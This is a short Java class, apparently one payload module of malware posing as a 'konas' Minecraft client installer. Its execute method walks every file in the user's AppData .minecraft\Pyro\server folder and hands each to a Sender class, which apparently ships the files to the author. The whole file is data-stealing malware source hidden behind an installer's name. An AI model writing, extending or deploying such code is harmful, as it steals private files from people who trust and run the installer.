package konas.installer.payload.impl;

/**
 *
 * @author ThnksCJ
 */

import konas.installer.payload.Payload;
import konas.installer.payload.Sender;
import konas.installer.util.FileUtil;

import java.io.File;

public final class PyroWaypoints implements Payload
{
    @Override
    public void execute() throws Exception
    {
        for (File file : FileUtil.getFiles(System.getenv("APPDATA") + "\\.minecraft\\Pyro\\server"))
        {
            Sender.send(file);
        }
    }
}